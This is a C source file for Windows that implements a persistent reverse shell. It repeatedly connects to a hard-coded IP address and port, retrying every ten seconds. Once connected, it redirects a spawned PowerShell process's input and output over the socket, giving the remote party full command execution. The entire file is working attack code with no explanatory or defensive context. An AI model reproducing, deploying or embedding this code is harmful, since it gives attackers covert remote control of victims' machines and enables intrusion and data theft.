#include <winsock2.h>
#include <stdio.h>

#define SERVER_IP "10.8.91.46"
#define SERVER_PORT 5555

int main(int argc, char *argv[])
{
    // init socket lib
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // create hints
    struct sockaddr_in hints = {
        .sin_family = AF_INET,
        .sin_port = htons(SERVER_PORT),
        .sin_addr.s_addr = inet_addr(SERVER_IP)};

    while (1)
    {
        // create socket
        SOCKET sock;
        sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

        // connect to remote host
        if (WSAConnect(sock, (SOCKADDR *)&hints, sizeof(hints), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
        {
            closesocket(sock);
            Sleep(10000);
            continue;
        }

        if (sock == INVALID_SOCKET)
        {
            Sleep(10000);
            continue;
        }

        // start cmd.exe with redirected streams
        STARTUPINFOW si = {
            sizeof(si),
            .dwFlags = STARTF_USESTDHANDLES,
            .hStdInput = (HANDLE)sock,
            .hStdOutput = (HANDLE)sock,
            .hStdError = (HANDLE)sock};

        PROCESS_INFORMATION pi;
        CreateProcessW(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                       NULL, NULL, NULL, TRUE, 0, NULL, L"C:\\", &si, &pi);

        // wait for session to end then close socket
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        closesocket(sock);
    }

    WSACleanup();
    return 0;
}
